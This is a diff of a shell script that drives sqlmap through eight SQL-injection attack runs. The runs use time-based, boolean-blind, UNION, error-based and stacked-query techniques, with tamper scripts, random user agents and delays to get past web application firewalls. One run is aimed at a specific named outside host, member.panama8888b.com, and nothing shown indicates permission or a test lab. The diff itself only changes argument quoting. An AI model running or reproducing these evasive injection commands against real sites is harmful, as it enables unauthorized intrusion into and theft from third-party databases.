@@ -48,7 +48,7 @@ run_sqlmap_test() {
 # Test 1: Basic detection with tamper scripts
 run_sqlmap_test "Test 1: Basic detection with tamper scripts" \
     "$OUTPUT_DIR/test1" \
-    "-u \"$TARGET_URL\" \
+    "-u $TARGET_URL \
     --batch \
     --level=3 \
     --risk=2 \
@@ -57,12 +57,12 @@ run_sqlmap_test "Test 1: Basic detection with tamper scripts" \
     --delay=1 \
     --timeout=15 \
     --retries=2 \
-    --output-dir=\"$OUTPUT_DIR/test1\""
+    --output-dir=$OUTPUT_DIR/test1"
 
 # Test 2: Time-based injection
 run_sqlmap_test "Test 2: Time-based injection" \
     "$OUTPUT_DIR/test2" \
-    "-u \"$TARGET_URL\" \
+    "-u $TARGET_URL \
     --batch \
     --technique=T \
     --time-sec=5 \
@@ -70,24 +70,24 @@ run_sqlmap_test "Test 2: Time-based injection" \
     --tamper=space2comment \
     --random-agent \
     --delay=2 \
-    --output-dir=\"$OUTPUT_DIR/test2\""
+    --output-dir=$OUTPUT_DIR/test2"
 
 # Test 3: Boolean-based blind injection
 run_sqlmap_test "Test 3: Boolean-based blind injection" \
     "$OUTPUT_DIR/test3" \
-    "-u \"$TARGET_URL\" \
+    "-u $TARGET_URL \
     --batch \
     --technique=B \
     --dbms=mssql \
     --tamper=space2comment,between \
     --random-agent \
     --delay=1 \
-    --output-dir=\"$OUTPUT_DIR/test3\""
+    --output-dir=$OUTPUT_DIR/test3"
 
 # Test 4: UNION-based injection
 run_sqlmap_test "Test 4: UNION-based injection" \
     "$OUTPUT_DIR/test4" \
-    "-u \"$TARGET_URL\" \
+    "-u $TARGET_URL \
     --batch \
     --technique=U \
     --union-cols=1-5 \
@@ -95,36 +95,36 @@ run_sqlmap_test "Test 4: UNION-based injection" \
     --tamper=space2comment \
     --random-agent \
     --delay=1 \
-    --output-dir=\"$OUTPUT_DIR/test4\""
+    --output-dir=$OUTPUT_DIR/test4"
 
 # Test 5: Error-based injection
 run_sqlmap_test "Test 5: Error-based injection" \
     "$OUTPUT_DIR/test5" \
-    "-u \"$TARGET_URL\" \
+    "-u $TARGET_URL \
     --batch \
     --technique=E \
     --dbms=mssql \
     --tamper=space2comment \
     --random-agent \
     --delay=1 \
-    --output-dir=\"$OUTPUT_DIR/test5\""
+    --output-dir=$OUTPUT_DIR/test5"
 
 # Test 6: Stacked queries
 run_sqlmap_test "Test 6: Stacked queries" \
     "$OUTPUT_DIR/test6" \
-    "-u \"$TARGET_URL\" \
+    "-u $TARGET_URL \
     --batch \
     --technique=S \
     --dbms=mssql \
     --tamper=space2comment \
     --random-agent \
     --delay=2 \
-    --output-dir=\"$OUTPUT_DIR/test6\""
+    --output-dir=$OUTPUT_DIR/test6"
 
 # Test 7: Advanced WAF bypass
 run_sqlmap_test "Test 7: Advanced WAF bypass" \
     "$OUTPUT_DIR/test7" \
-    "-u \"$TARGET_URL\" \
+    "-u $TARGET_URL \
     --batch \
     --level=5 \
     --risk=3 \
@@ -134,12 +134,12 @@ run_sqlmap_test "Test 7: Advanced WAF bypass" \
     --delay=3 \
     --timeout=20 \
     --retries=3 \
-    --output-dir=\"$OUTPUT_DIR/test7\""
+    --output-dir=$OUTPUT_DIR/test7"
 
 # Test 8: Custom injection point
 run_sqlmap_test "Test 8: Custom injection point" \
     "$OUTPUT_DIR/test8" \
-    "-u \"https://member.panama8888b.com/public/js/v2/app.js?v=25.1*\" \
+    "-u https://member.panama8888b.com/public/js/v2/app.js?v=25.1* \
     --batch \
     --level=3 \
     --risk=2 \
@@ -147,7 +147,7 @@ run_sqlmap_test "Test 8: Custom injection point" \
     --tamper=space2comment \
     --random-agent \
     --delay=1 \
-    --output-dir=\"$OUTPUT_DIR/test8\""
+    --output-dir=$OUTPUT_DIR/test8"
 
 # Generate summary report
 echo -e "${GREEN}[+] Generating summary report...${NC}"
